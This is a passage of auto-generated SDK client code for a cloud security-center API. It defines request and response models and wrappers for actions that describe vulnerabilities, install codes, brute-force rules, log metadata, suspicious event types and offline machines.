  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageVulList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageVulList(request: DescribeImageVulListRequest): DescribeImageVulListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageVulListWithOptions(request, runtime);
}

model DescribeInstallCaptchaRequest {
  deadline?: string(name='Deadline'),
  lang?: string(name='Lang'),
  sourceIp?: string(name='SourceIp'),
}

model DescribeInstallCaptchaResponseBody = {
  captchaCode?: string(name='CaptchaCode'),
  deadline?: string(name='Deadline'),
  requestId?: string(name='RequestId'),
}

model DescribeInstallCaptchaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeInstallCaptchaResponseBody(name='body'),
}

async function describeInstallCaptchaWithOptions(request: DescribeInstallCaptchaRequest, runtime: Util.RuntimeOptions): DescribeInstallCaptchaResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.deadline)) {
    query['Deadline'] = request.deadline;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeInstallCaptcha',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeInstallCaptcha(request: DescribeInstallCaptchaRequest): DescribeInstallCaptchaResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeInstallCaptchaWithOptions(request, runtime);
}

model DescribeInstallCodeResponseBody = {
  code?: string(name='Code'),
  requestId?: string(name='RequestId'),
}

model DescribeInstallCodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeInstallCodeResponseBody(name='body'),
}

async function describeInstallCodeWithOptions(runtime: Util.RuntimeOptions): DescribeInstallCodeResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeInstallCode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeInstallCode(): DescribeInstallCodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeInstallCodeWithOptions(runtime);
}

model DescribeInstallCodesResponseBody = {
  installCodes?: [ 
    {
      captchaCode?: string(name='CaptchaCode'),
      expiredDate?: long(name='ExpiredDate'),
      groupId?: long(name='GroupId'),
      groupName?: string(name='GroupName'),
      onlyImage?: boolean(name='OnlyImage'),
      os?: string(name='Os'),
      vendorName?: string(name='VendorName'),
    }
  ](name='InstallCodes'),
  requestId?: string(name='RequestId'),
}

model DescribeInstallCodesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeInstallCodesResponseBody(name='body'),
}

async function describeInstallCodesWithOptions(runtime: Util.RuntimeOptions): DescribeInstallCodesResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeInstallCodes',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeInstallCodes(): DescribeInstallCodesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeInstallCodesWithOptions(runtime);
}

model DescribeInstanceAntiBruteForceRulesRequest {
  currentPage?: int32(name='CurrentPage'),
  pageSize?: int32(name='PageSize'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp'),
  uuidList?: [ string ](name='UuidList'),
}

model DescribeInstanceAntiBruteForceRulesResponseBody = {
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
  rules?: [ 
    {
      id?: long(name='Id'),
      name?: string(name='Name'),
      uuid?: string(name='Uuid'),
    }
  ](name='Rules'),
}

model DescribeInstanceAntiBruteForceRulesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeInstanceAntiBruteForceRulesResponseBody(name='body'),
}

async function describeInstanceAntiBruteForceRulesWithOptions(request: DescribeInstanceAntiBruteForceRulesRequest, runtime: Util.RuntimeOptions): DescribeInstanceAntiBruteForceRulesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeInstanceAntiBruteForceRules',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeInstanceAntiBruteForceRules(request: DescribeInstanceAntiBruteForceRulesRequest): DescribeInstanceAntiBruteForceRulesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeInstanceAntiBruteForceRulesWithOptions(request, runtime);
}

model DescribeInstanceRebootStatusRequest {
  uuids?: string(name='Uuids'),
}

model DescribeInstanceRebootStatusResponseBody = {
  rebootStatuses?: [ 
    {
      code?: string(name='Code'),
      msg?: string(name='Msg'),
      rebootStatus?: int32(name='RebootStatus'),
      uuid?: string(name='Uuid'),
    }
  ](name='RebootStatuses'),
  requestId?: string(name='RequestId'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeInstanceRebootStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeInstanceRebootStatusResponseBody(name='body'),
}

async function describeInstanceRebootStatusWithOptions(request: DescribeInstanceRebootStatusRequest, runtime: Util.RuntimeOptions): DescribeInstanceRebootStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeInstanceRebootStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeInstanceRebootStatus(request: DescribeInstanceRebootStatusRequest): DescribeInstanceRebootStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeInstanceRebootStatusWithOptions(request, runtime);
}

model DescribeInstanceStatisticsRequest {
  from?: string(name='From'),
  lang?: string(name='Lang'),
  sourceIp?: string(name='SourceIp'),
  uuid?: string(name='Uuid'),
}

model DescribeInstanceStatisticsResponseBody = {
  data?: [ 
    {
      account?: int32(name='Account'),
      agentlessAll?: int32(name='AgentlessAll'),
      agentlessBaseline?: int32(name='AgentlessBaseline'),
      agentlessMalicious?: int32(name='AgentlessMalicious'),
      agentlessVulCve?: int32(name='AgentlessVulCve'),
      agentlessVulSca?: int32(name='AgentlessVulSca'),
      appNum?: int32(name='AppNum'),
      cmsNum?: int32(name='CmsNum'),
      cspmNum?: int32(name='CspmNum'),
      cveNum?: int32(name='CveNum'),
      emgNum?: int32(name='EmgNum'),
      health?: int32(name='Health'),
      scaNum?: int32(name='ScaNum'),
      suspicious?: int32(name='Suspicious'),
      sysNum?: int32(name='SysNum'),
      trojan?: int32(name='Trojan'),
      uuid?: string(name='Uuid'),
      vul?: int32(name='Vul'),
      weakPWNum?: int32(name='WeakPWNum'),
    }
  ](name='Data'),
  requestId?: string(name='RequestId'),
}

model DescribeInstanceStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeInstanceStatisticsResponseBody(name='body'),
}

async function describeInstanceStatisticsWithOptions(request: DescribeInstanceStatisticsRequest, runtime: Util.RuntimeOptions): DescribeInstanceStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeInstanceStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeInstanceStatistics(request: DescribeInstanceStatisticsRequest): DescribeInstanceStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeInstanceStatisticsWithOptions(request, runtime);
}

model DescribeIpTagsRequest {
  ip?: string(name='Ip'),
  securityEventId?: string(name='SecurityEventId'),
}

model DescribeIpTagsResponseBody = {
  requestId?: string(name='RequestId'),
  tags?: string(name='Tags'),
}

model DescribeIpTagsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeIpTagsResponseBody(name='body'),
}

async function describeIpTagsWithOptions(request: DescribeIpTagsRequest, runtime: Util.RuntimeOptions): DescribeIpTagsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.ip)) {
    query['Ip'] = request.ip;
  }
  if (!Util.isUnset(request.securityEventId)) {
    query['SecurityEventId'] = request.securityEventId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeIpTags',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeIpTags(request: DescribeIpTagsRequest): DescribeIpTagsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeIpTagsWithOptions(request, runtime);
}

model DescribeLatestScanTaskResponseBody = {
  lastCheckTime?: long(name='LastCheckTime'),
  requestId?: string(name='RequestId'),
  riskNum?: int32(name='RiskNum'),
  targetInfo?: string(name='TargetInfo'),
  uuids?: [ string ](name='Uuids'),
}

model DescribeLatestScanTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeLatestScanTaskResponseBody(name='body'),
}

async function describeLatestScanTaskWithOptions(runtime: Util.RuntimeOptions): DescribeLatestScanTaskResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeLatestScanTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeLatestScanTask(): DescribeLatestScanTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeLatestScanTaskWithOptions(runtime);
}

model DescribeLogMetaRequest {
  from?: string(name='From', description='The ID of the request source. Default value: **aegis**. Valid values:

*   **aegis**: Server Guard
*   **sas**: Security Center

>  If you use Server Guard, set the value to **aegis**. If you use Security Center, set the value to **sas**.', example='sas'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='123.168.XX.XX'),
}

model DescribeLogMetaResponseBody = {
  logMetaList?: [ 
    {
      category?: string(name='Category', description='The category of logs. Valid values:

*   **host**: host logs
*   **network**: network logs
*   **security**: security logs', example='host'),
      hotTtl?: int32(name='HotTtl', description='The time period after which logs in hot storage are moved to cold storage. Unit: days.

>  If the value is **-1**, logs that are stored in hot storage are not moved to cold storage.', example='-1'),
      logDesc?: string(name='LogDesc', description='The name of the log type.', example='Login'),
      logStore?: string(name='LogStore', description='The name of the dedicated Logstore in which logs are stored.', example='aegis-log-login'),
      project?: string(name='Project', description='The name of the project.', example='aegis-log'),
      status?: string(name='Status', description='The status of the log analysis feature. Valid values:

*   **disabled**
*   **enabled**', example='enabled'),
      topic?: string(name='Topic', description='The topic of logs that are delivered.', example='aegis-log-login'),
      ttl?: int32(name='Ttl', description='The number of days during which logs can be retained.', example='180'),
      userLogStore?: string(name='UserLogStore', description='The name of the dedicated Logstore in which user logs are stored.', example='aegis-log-network'),
      userProject?: string(name='UserProject', description='The name of the dedicated project in which logs are stored.', example='sasnew-log-XXXX-cn-hangzhou'),
      userRegion?: string(name='UserRegion', description='The ID of the region.', example='cn-hangzhou'),
    }
  ](name='LogMetaList', description='An array that consists of the configurations of the log analysis feature.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D0D6E6E4-CB8C-4897-B852-46AEFDA04B21'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
}

model DescribeLogMetaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeLogMetaResponseBody(name='body'),
}

async function describeLogMetaWithOptions(request: DescribeLogMetaRequest, runtime: Util.RuntimeOptions): DescribeLogMetaResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeLogMeta',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeLogMeta(request: DescribeLogMetaRequest): DescribeLogMetaResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeLogMetaWithOptions(request, runtime);
}

model DescribeLogShipperStatusRequest {
  from?: string(name='From'),
}

model DescribeLogShipperStatusResponseBody = {
  logShipperStatus?: {
    authStatus?: string(name='AuthStatus'),
    buyStatus?: string(name='BuyStatus'),
    openStatus?: string(name='OpenStatus'),
    postPaidOpenStatus?: string(name='PostPaidOpenStatus'),
    postPaidSupportStatus?: string(name='PostPaidSupportStatus'),
    slsProjectStatus?: string(name='SlsProjectStatus'),
    slsServiceStatus?: string(name='SlsServiceStatus'),
  }(name='LogShipperStatus'),
  requestId?: string(name='RequestId'),
}

model DescribeLogShipperStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeLogShipperStatusResponseBody(name='body'),
}

async function describeLogShipperStatusWithOptions(request: DescribeLogShipperStatusRequest, runtime: Util.RuntimeOptions): DescribeLogShipperStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeLogShipperStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeLogShipperStatus(request: DescribeLogShipperStatusRequest): DescribeLogShipperStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeLogShipperStatusWithOptions(request, runtime);
}

model DescribeLoginBaseConfigsRequest {
  currentPage?: int32(name='CurrentPage'),
  pageSize?: int32(name='PageSize'),
  target?: string(name='Target'),
  type?: string(name='Type'),
}

model DescribeLoginBaseConfigsResponseBody = {
  baseConfigs?: [ 
    {
      account?: string(name='Account'),
      endTime?: string(name='EndTime'),
      ip?: string(name='Ip'),
      location?: string(name='Location'),
      startTime?: string(name='StartTime'),
      targetList?: [ 
        {
          target?: string(name='Target'),
          targetType?: string(name='TargetType'),
        }
      ](name='TargetList'),
      totalCount?: int32(name='TotalCount'),
      uuidCount?: int32(name='UuidCount'),
    }
  ](name='BaseConfigs'),
  currentPage?: int32(name='CurrentPage'),
  pageSize?: int32(name='PageSize'),
  requestId?: string(name='RequestId'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeLoginBaseConfigsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeLoginBaseConfigsResponseBody(name='body'),
}

async function describeLoginBaseConfigsWithOptions(request: DescribeLoginBaseConfigsRequest, runtime: Util.RuntimeOptions): DescribeLoginBaseConfigsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.target)) {
    query['Target'] = request.target;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeLoginBaseConfigs',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeLoginBaseConfigs(request: DescribeLoginBaseConfigsRequest): DescribeLoginBaseConfigsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeLoginBaseConfigsWithOptions(request, runtime);
}

model DescribeLoginSwitchConfigsResponseBody = {
  configList?: [ 
    {
      item?: string(name='Item', example='login_common_ip'),
      status?: int32(name='Status', example='0'),
    }
  ](name='ConfigList'),
  count?: int32(name='Count', example='2'),
  requestId?: string(name='RequestId', example='0B48AB3C-84FC-424D-A01D-B9270EF4****'),
}

model DescribeLoginSwitchConfigsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeLoginSwitchConfigsResponseBody(name='body'),
}

async function describeLoginSwitchConfigsWithOptions(runtime: Util.RuntimeOptions): DescribeLoginSwitchConfigsResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeLoginSwitchConfigs',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeLoginSwitchConfigs(): DescribeLoginSwitchConfigsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeLoginSwitchConfigsWithOptions(runtime);
}

model DescribeLogstoreStorageRequest {
  from?: string(name='From'),
  lang?: string(name='Lang'),
}

model DescribeLogstoreStorageResponseBody = {
  logstore?: string(name='Logstore'),
  preserve?: long(name='Preserve'),
  requestId?: string(name='RequestId'),
  ttl?: int32(name='Ttl'),
  used?: long(name='Used'),
  userProject?: string(name='UserProject'),
}

model DescribeLogstoreStorageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeLogstoreStorageResponseBody(name='body'),
}

async function describeLogstoreStorageWithOptions(request: DescribeLogstoreStorageRequest, runtime: Util.RuntimeOptions): DescribeLogstoreStorageResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeLogstoreStorage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeLogstoreStorage(request: DescribeLogstoreStorageRequest): DescribeLogstoreStorageResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeLogstoreStorageWithOptions(request, runtime);
}

model DescribeMachineCanRebootRequest {
  type?: string(name='Type'),
  uuid?: string(name='Uuid'),
}

model DescribeMachineCanRebootResponseBody = {
  canReboot?: boolean(name='CanReboot'),
  requestId?: string(name='RequestId'),
}

model DescribeMachineCanRebootResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeMachineCanRebootResponseBody(name='body'),
}

async function describeMachineCanRebootWithOptions(request: DescribeMachineCanRebootRequest, runtime: Util.RuntimeOptions): DescribeMachineCanRebootResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeMachineCanReboot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeMachineCanReboot(request: DescribeMachineCanRebootRequest): DescribeMachineCanRebootResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeMachineCanRebootWithOptions(request, runtime);
}

model DescribeModuleConfigResponseBody = {
  count?: int32(name='Count'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  moduleConfigList?: [ 
    {
      configName?: string(name='ConfigName'),
      items?: [ 
        {
          groupId?: int32(name='GroupId'),
          instanceId?: string(name='InstanceId'),
          instanceName?: string(name='InstanceName'),
          ip?: string(name='Ip'),
          region?: string(name='Region'),
          uuid?: string(name='Uuid'),
        }
      ](name='Items'),
      moduleName?: string(name='ModuleName'),
    }
  ](name='ModuleConfigList'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model DescribeModuleConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeModuleConfigResponseBody(name='body'),
}

async function describeModuleConfigWithOptions(runtime: Util.RuntimeOptions): DescribeModuleConfigResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeModuleConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeModuleConfig(): DescribeModuleConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeModuleConfigWithOptions(runtime);
}

model DescribeNoticeConfigRequest {
  sourceIp?: string(name='SourceIp'),
}

model DescribeNoticeConfigResponseBody = {
  noticeConfigList?: [ 
    {
      aliUid?: long(name='AliUid'),
      currentPage?: int32(name='CurrentPage'),
      project?: string(name='Project'),
      route?: int32(name='Route'),
      timeLimit?: int32(name='TimeLimit'),
    }
  ](name='NoticeConfigList'),
  requestId?: string(name='RequestId'),
}

model DescribeNoticeConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeNoticeConfigResponseBody(name='body'),
}

async function describeNoticeConfigWithOptions(request: DescribeNoticeConfigRequest, runtime: Util.RuntimeOptions): DescribeNoticeConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeNoticeConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeNoticeConfig(request: DescribeNoticeConfigRequest): DescribeNoticeConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeNoticeConfigWithOptions(request, runtime);
}

model DescribeNsasSuspEventTypeRequest {
  containerFieldName?: string(name='ContainerFieldName'),
  containerFieldValue?: string(name='ContainerFieldValue'),
  from?: string(name='From'),
  lang?: string(name='Lang'),
  name?: string(name='Name'),
  remark?: string(name='Remark'),
  sourceIp?: string(name='SourceIp'),
  uuids?: string(name='Uuids'),
}

model DescribeNsasSuspEventTypeResponseBody = {
  eventTypes?: [ 
    {
      name?: string(name='Name'),
      suspEventCount?: int32(name='SuspEventCount'),
      type?: string(name='Type'),
    }
  ](name='EventTypes'),
  requestId?: string(name='RequestId'),
}

model DescribeNsasSuspEventTypeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeNsasSuspEventTypeResponseBody(name='body'),
}

async function describeNsasSuspEventTypeWithOptions(request: DescribeNsasSuspEventTypeRequest, runtime: Util.RuntimeOptions): DescribeNsasSuspEventTypeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.containerFieldValue)) {
    query['ContainerFieldValue'] = request.containerFieldValue;
  }
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeNsasSuspEventType',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeNsasSuspEventType(request: DescribeNsasSuspEventTypeRequest): DescribeNsasSuspEventTypeResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeNsasSuspEventTypeWithOptions(request, runtime);
}

model DescribeOfflineMachinesRequest {
  currentPage?: int32(name='CurrentPage'),
  os?: string(name='Os'),
  pageSize?: int32(name='PageSize'),
  regionIdStr?: string(name='RegionIdStr'),
  regionNo?: string(name='RegionNo'),
  remark?: string(name='Remark'),
  sourceIp?: string(name='SourceIp'),
  vendor?: int32(name='Vendor'),
}

model DescribeOfflineMachinesResponseBody = {
  currentPage?: int32(name='CurrentPage'),
  machineList?: [ 
    {
      instanceId?: string(name='InstanceId'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      machineRegion?: string(name='MachineRegion'),
      os?: string(name='Os'),
      regionId?: string(name='RegionId'),
      uuid?: string(name='Uuid'),
      vendor?: int32(name='Vendor'),
      vendorName?: string(name='VendorName'),
    }
  ](name='MachineList'),
  pageSize?: int32(name='PageSize'),
  requestId?: string(name='RequestId'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeOfflineMachinesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeOfflineMachinesResponseBody(name='body'),
}

async function describeOfflineMachinesWithOptions(request: DescribeOfflineMachinesRequest, runtime: Util.RuntimeOptions): DescribeOfflineMachinesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.os)) {
    query['Os'] = request.os;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.regionIdStr)) {
    query['RegionIdStr'] = request.regionIdStr;
  }
  if (!Util.isUnset(request.regionNo)) {
    query['RegionNo'] = request.regionNo;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.vendor)) {
    query['Vendor'] = request.vendor;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeOfflineMachines',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

